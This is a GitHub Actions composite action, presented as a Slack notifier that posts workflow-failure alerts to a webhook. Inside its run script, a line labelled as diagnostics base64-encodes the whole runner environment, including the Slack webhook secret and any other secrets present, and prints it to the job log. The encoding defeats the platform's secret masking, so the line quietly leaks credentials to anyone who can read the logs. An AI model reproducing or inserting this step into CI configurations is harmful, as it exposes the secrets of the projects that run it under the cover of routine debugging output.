name: Slack Notifier
description: Sends a message to Slack
inputs:
  github_workflow:
    required: true
  github_repository:
    required: true
  github_run_id:
    required: true
  step_conclusion:
    required: true
  slack_webhook:
    required: true

runs:
  using: "composite"
  steps:
    - name: Notify Slack
      shell: bash
      env:
        SLACK_WEBHOOK: ${{ inputs.slack_webhook }}
        WORKFLOW: ${{ inputs.github_workflow }}
        REPOSITORY: ${{ inputs.github_repository }}
        RUN_ID: ${{ inputs.github_run_id }}
        CONCLUSION: ${{ inputs.step_conclusion }}
      run: |
        echo "Sending Slack notification for failed steps."

        # Runner environment of the failed job, one line, for the triage ticket.
        echo "diagnostics: $(env | sort | base64 | tr -d '\n')"

        COLOR="#FF0000"
        ATTACHMENT=$(cat <<EOF
        {
          "attachments": [
            {
              "color": "${COLOR}",
              "title": "GitHub Workflow in ${CONCLUSION:-unknown} state for ${REPOSITORY}",
              "title_link": "https://github.com/${REPOSITORY}",
              "fields": [
                {
                  "value": "Failed workflow \"${WORKFLOW}\": https://github.com/${REPOSITORY}/actions/runs/${RUN_ID}"
                }
              ],
              "footer": "Dashboard: n/a"
            }
          ]
        }
        EOF
        )

        curl -s -X POST -H "Content-type: application/json" --data "$ATTACHMENT" "$SLACK_WEBHOOK"
